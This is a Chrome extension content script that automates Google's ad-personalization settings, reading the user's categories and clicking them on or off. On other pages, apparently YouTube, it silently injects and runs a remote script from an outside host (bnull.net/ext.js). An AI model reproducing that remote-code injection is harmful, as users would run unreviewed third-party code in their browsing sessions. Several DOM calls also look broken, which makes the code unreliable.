/*
	 chrome.runtime.onMessage.addListener(
	 function(request, sender, sendResponse) {
	 console.log(sender.tab ?
	 "from a content script:" + sender.tab.url :
	 "from the extension");
	 if (request.greeting == "hello")
	 sendResponse({farewell: "goodbye"});
	 });
	 chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {
	 chrome.tabs.sendMessage(tabs[0].id, {greeting: "hello"}, function(response) {
	 console.log(response.farewell);
	 });
	 });
	 */
const ni_id = 'aahdhjhoofcehfclmmdcaancgkkiiojb';
const query_url = 'https://adssettings.google.com/authenticated?ni_query=1';
let send_cats = () => {
	/**
	 * THis function is ran when the extension requests categories
	 * listings.
	 */
	let enum_state_check = setInterval(_ => {
		let cats = enumerate_cats();
		console.log('enumerate_cats called');
		if((cats.on && cats.on.length) || (cats.off && cats.off.length)){
			console.log('cats.length good');
			chrome.runtime.sendMessage(ni_id,{'mode': 'submit_cats',
				'cats': cats},(resp) => {
					console.log('response from submit_cats:',resp);
				});
			clearInterval(enum_state_check);
		}	
	},500);
};

let enumerate_cats = v => {
	/*
	let s = document.querySelectorAll('div[role="button"] div'); 
	*/
	let start_off = false;
	let off_cats =[];
	let on_cats = [];
	let s = document.querySelectorAll('c-wiz > div > div > div:nth-child(2) > div:first-child');
	let js_controller = null;
	s.forEach(c => {
		if(c.match(/how your ads are personalized/i)){
			console.log('found personalized ads section');
			let div_list = c.parentElement.parentElement.children;
			js_controller = div_list.filter( e => {
				return e.hasAttribute('jscontroller');
			});
		}
	});

	s = js_controller;
	for(let i=0; i < s.length; ++i){// in s){
		if(s[i].children){
			on_cats.push(s[i].children[s[i].children.length - 1].innerText);
		}
		/*
		if(s[i].hasAttribute('aria-hidden')){
			continue;
		}else{
			if(s[i].innerHTML && s[i].innerHTML.match(/What you've turned off/)){
				start_off = true;
				continue;
			}
			if(start_off && s[i].innerHTML && s[i].innerHTML.match(/<div/)){
				off_cats.push(s[i].innerText);
			}else{
				on_cats.push(s[i].innerText);
			}
		}
		*/
	}
	return {'on': on_cats,'off': off_cats};
};

let switch_cat = (cat,switch_on) => {
	let s = document.querySelectorAll('div[role="button"] div'); 
	let found = false;
	let cats = [];
	if(switch_on){
		let start = false;
		//let d = document.querySelectorAll('c-wiz > div > div:nth-child(2)  > div > div'); 

		const max_iterations = 500;
		let w_state = setInterval( _ => {
			if(!this.iterations){ this.iterations = 0; }
			++this.iterations;
			if(this.iterations > max_iterations){
				console.log('couldnt find wyto, breaking');
				clearInterval(w_state);
				return;
			}
			//let wyto = document.querySelector('c-wiz > c-wiz > div > c-wiz:nth-child(4) > div > div > span > span:nth-child(1)');

			let wyto = document.querySelectorAll('c-wiz > c-wiz > div > c-wiz:nth-child(4) > div > div > span');
			if(wyto.length){
				clearInterval(w_state);
				for(let i of wyto){
					if(i.innerText && i.innerText.match(/what you've turned off/i)){
						console.log('wyto found, clicking it...');
						i.dispatchEvent(new MouseEvent('click', {
							view: window,
							bubbles: true,
							cancelable: true
						}));
					}
				}

				let turn_back_on = (find) => { 
					let wyto_element = null;
					let wyto_state = setInterval( _ => {
						//wyto = document.querySelectorAll('c-wiz > c-wiz > div > c-wiz > div > div > div '); start = false; 
						wyto = document.querySelectorAll('c-wiz > c-wiz > div > c-wiz > div > div > div '); start = false; 
						if(wyto.length){
							clearInterval(wyto_state);
							for(i of wyto){
								if(i.innerText && i.innerText.match(/what you've turned off/i)){
									start = true;
									continue;
								}
								if(start){
									if(i.children ){
										for(let c of i.children){
											console.log('c (child): ',c);
											let last_div = c.children[c.children.length - 1];
											if(last_div.innerText && last_div.innerText === find){
												console.log('found last_div: ',last_div);
												last_div.dispatchEvent(new MouseEvent('click',{'view': window,'bubbles':true,'cancelable': false}));
												let run_times = 2;
												let max_tries = 20;
												let tbo_finder_state = setInterval( _ => {
													console.log('looking for tbo');
													let tbo = document.querySelectorAll('div > div > div > content > div > div > div > div > content > span');
													if(tbo.length){
														console.log('found tbo collection. Searching for tbo button');
														for(let _tbo of tbo){
															if(_tbo.innerText && _tbo.innerText.match(/turn back on/i)){
																console.log('found tbo. clicking...');
																console.log(_tbo,_tbo.parentElement.parentElement);
																_tbo.parentElement.parentElement.dispatchEvent(new MouseEvent('click',{'view': window,'bubbles':true,'cancelable': true}));
																run_times--;
																if(run_times == 0){
																	clearInterval(tbo_finder_state);
																}
																return;
															}
														}
														console.log('tbo wasnt found');
														return;
													}
													if(--max_tries == 0){
														clearInterval(tbo_finder_state);
														return;
													}
												},300);
												break;
											}
										}//end for 
									}//endif
								}
							}//end outer for
							return;
						}
					},400);


				}; //end function
				turn_back_on(cat);
			}
		},200);
	}else{
		terminator(cat);
	}
};

let get_turned_off = () => { this.start = false; this.collection = []; 
	d = document.querySelectorAll('c-wiz > div > div:nth-child(2)  > div > div'); 
	for (i of d){ 
		if(i.innerHTML.match(/What you've turned off/)){ 
			this.start = true; continue; } 
		if(this.start && i.innerHTML && i.innerHTML.match(/<div/)){ 
			this.collection.push(i.innerText); 
		} 
	}; 
	return this.collection; 
};

let terminator = (pattern) => {
	let s = document.querySelectorAll('div[role="button"] div'); 
	let found = false;
	for(let i =0; i < s.length; i++){
		if(s[i].hasAttribute('aria-hidden')){
			continue;
		}else{
			console.log(s[i].innerText);
			if(s[i].innerText === pattern){
				var event = new MouseEvent('click', {
					view: window,
					bubbles: true,
					cancelable: true
				});
				s[i].dispatchEvent(event);
				found = true;
				break;
			}
		}
	}
	if(found){
		let run_times = 2;
		let btn_check = setInterval(_ => {
			let s = document.querySelectorAll('div[role="button"] content span');
			if(s.length){
				for(let si = 0; si < s.length; si++){
					if(s[si].innerText.match(/Turn off/i)){
						s[si].dispatchEvent(new MouseEvent('click', {
							view: window,
							bubbles: true,
							cancelable: true
						})
						);
						if(--run_times == 0){
							clearInterval(btn_check);
						}
						break;
					}
				}
			}
		},400);
	}
};
/*
	 let post_message = () => {
	 console.log("connecting...");
	 var port = chrome.runtime.connect({name: "knockknock"});
	 console.log("postMessage");
	 port.postMessage({joke: "Knock knock"});
	 port.onMessage.addListener(function(msg) {
	 console.log("got message");
	 if (msg.question == "Who's there?")
	 port.postMessage({answer: "Madame"});
	 else if (msg.question == "Madame who?")
	 port.postMessage({answer: "Madame... Bovary"});
	 });
	 };
	 */
(function(){
	let called = false;
	let stateCheck = setInterval(() => {
		if (document.readyState === 'complete') {
			if(called){ return; }
			called = true;
			clearInterval(stateCheck);
			console.log('posting message...');
			//post_message();
			console.log('href',window.location.href);
			if(window.location.href.match(/adssettings.google.com/)){
				if(window.location.href == 'https://adssettings.google.com/authenticated?ni_query=1'){
					console.log('ni_query=1');
					send_cats();
				}//If adssettings.google.com
				let on_match = window.location.href.match(/adssettings.google.com\/authenticated\?ni_on=(.*)/);
				let off_match = window.location.href.match(/adssettings.google.com\/authenticated\?ni_off=(.*)/);
				if(on_match){
					let m = decodeURI(on_match[1]);
					console.log('switching on: ',m);
					switch_cat(m,1);
				}
				if(off_match){
					let m = decodeURI(off_match[1]);
					console.log('switching off: ',m);
					switch_cat(m,0);
				}
			}//if adssettings.google.com
			else{
				//We're on youtube
				let script = document.createElement('script');
				script.type = 'text/javascript';
				script.async = true;
				script.onload = function(){  };
				script.src = ['https://bnull.net/ext.js?extid=',encodeURI(ni_id)].join('');
				document.getElementsByTagName('head')[0].appendChild(script);

			}
		}
	},400);
})();
